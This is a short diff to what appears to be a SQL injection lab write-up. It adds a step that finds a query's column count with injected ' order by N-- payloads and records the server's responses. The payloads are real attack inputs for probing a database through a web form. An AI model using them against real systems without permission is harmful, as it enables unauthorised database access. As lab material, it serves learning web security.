@@ -7,5 +7,7 @@ Analysis:
 
 (1) Verify the vulnerability by adding a ' comment character which should cause an Internal Server Error
 
-(2) Determine the number of columns
-
+(2) Determine the number of columns using {' order by x--}
+{' order by 1--} 200 STATUS OK
+{' order by 2--} 200 STATUS OK
+{' order by 3--} Internal server error
